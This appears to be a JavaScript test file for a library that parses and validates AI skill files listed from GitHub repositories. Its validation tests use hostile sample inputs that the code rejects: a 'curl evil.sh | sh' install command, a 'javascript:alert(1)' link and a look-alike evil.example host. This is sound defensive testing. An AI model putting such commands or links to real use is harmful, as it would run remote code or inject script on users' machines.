import { test } from 'node:test';
import assert from 'node:assert/strict';
import { finalizeSkills, normalizeSkill, parseFrontmatter, skillPaths, summarize, validateSkills } from '../lib/skills.mjs';

const repo = (over = {}) => ({
  name: 'critical-reviewer-skill', full_name: 'konraddzbik/critical-reviewer-skill',
  html_url: 'https://github.com/konraddzbik/critical-reviewer-skill', default_branch: 'main',
  stargazers_count: 2, license: { spdx_id: 'MIT' }, ...over,
});
const md = (frontmatter) => `---\n${frontmatter}\n---\n\n# Body\n`;

test('parseFrontmatter reads plain, quoted and block scalars', () => {
  const fields = parseFrontmatter(md([
    'name: red-team',
    'description: >-',
    '  Live red-team that RUNS attacks.',
    '  Second line.',
    'quoted: "It\'s \\"fine\\": yes"',
    "single: 'it''s'",
    'metadata:',
    "  updated: '2026-10-26'",
  ].join('\n')));
  assert.equal(fields.name, 'red-team');
  assert.equal(fields.description, 'Live red-team that RUNS attacks. Second line.');
  assert.equal(fields.quoted, 'It\'s "fine": yes');
  assert.equal(fields.single, "it's");
  assert.equal(fields.updated, undefined, 'nested keys are not top-level fields');
});

test('parseFrontmatter returns nothing without front matter', () => {
  assert.deepEqual(parseFrontmatter('# Just markdown'), {});
  assert.deepEqual(parseFrontmatter('---\nname: x\n'), {});
});

test('summarize keeps the first sentence and caps its length', () => {
  assert.equal(summarize('Direct code review. Invoke when user says "review this".'), 'Direct code review.');
  assert.equal(summarize('No full stop here'), 'No full stop here');
  assert.equal(summarize('v1.5.0 ships e.g. diagrams. Next.'), 'v1.5.0 ships e.g. diagrams.');
  const long = summarize('word '.repeat(100) + '.');
  assert.ok(long.length <= 300 && long.endsWith('…'));
  assert.equal(summarize(undefined), null);
});

test('skillPaths finds SKILL.md files anywhere except node_modules', () => {
  assert.deepEqual(
    skillPaths(['SKILL.md', 'skills/a/SKILL.md', '.claude/skills/b/SKILL.md', 'node_modules/x/SKILL.md', 'docs/MYSKILL.md', 'README.md']),
    ['SKILL.md', 'skills/a/SKILL.md', '.claude/skills/b/SKILL.md']
  );
});

test('normalizeSkill links to the skill folder and adds the marketplace install command', () => {
  const skill = normalizeSkill(repo(), 'skills/critical-reviewer/SKILL.md',
    md('name: critical-reviewer\ndescription: "Direct review. Invoke when asked."'), { hasMarketplace: true });
  assert.deepEqual(skill, {
    name: 'critical-reviewer',
    description: 'Direct review.',
    url: 'https://github.com/konraddzbik/critical-reviewer-skill/tree/main/skills/critical-reviewer',
    repo: 'critical-reviewer-skill',
    repoUrl: 'https://github.com/konraddzbik/critical-reviewer-skill',
    stars: 2,
    license: 'MIT',
    install: '/plugin marketplace add konraddzbik/critical-reviewer-skill',
  });
});

test('normalizeSkill handles a root SKILL.md, missing name and unknown license', () => {
  const skill = normalizeSkill(repo({ name: 'red-team-skills', full_name: 'konraddzbik/red-team-skills', html_url: 'https://github.com/konraddzbik/red-team-skills', license: { spdx_id: 'NOASSERTION' }, stargazers_count: -1 }),
    'SKILL.md', md('description: Attacks your app.'));
  assert.equal(skill.name, 'red-team-skills');
  assert.equal(skill.url, 'https://github.com/konraddzbik/red-team-skills');
  assert.equal(skill.license, null);
  assert.equal(skill.install, null);
  assert.equal(skill.stars, 0);
});

test('normalizeSkill drops skills without a description or with a non-GitHub repo URL', () => {
  assert.equal(normalizeSkill(repo(), 'SKILL.md', md('name: x')), null);
  assert.equal(normalizeSkill(repo({ html_url: 'javascript:alert(1)' }), 'SKILL.md', md('name: x\ndescription: y.')), null);
  assert.equal(normalizeSkill(repo({ html_url: 'https://github.com.evil.example/x' }), 'SKILL.md', md('name: x\ndescription: y.')), null);
});

test('finalizeSkills sorts by stars then name and output validates', () => {
  const make = (name, stars) => normalizeSkill(repo({ stargazers_count: stars }), `skills/${name}/SKILL.md`, md(`name: ${name}\ndescription: ${name}.`));
  const data = finalizeSkills([make('b', 1), make('a', 1), make('top', 133), null]);
  assert.deepEqual(data.items.map(s => s.name), ['top', 'a', 'b']);
  validateSkills(data);
});

test('validateSkills rejects unsafe or malformed items', () => {
  const good = normalizeSkill(repo(), 'skills/x/SKILL.md', md('name: x\ndescription: y.'), { hasMarketplace: true });
  validateSkills({ items: [good] });
  assert.throws(() => validateSkills({ items: [{ ...good, url: 'javascript:alert(1)' }] }));
  assert.throws(() => validateSkills({ items: [{ ...good, install: 'curl evil.sh | sh' }] }));
  assert.throws(() => validateSkills({ items: [{ ...good, description: '' }] }));
  assert.throws(() => validateSkills({ items: 'nope' }));
});
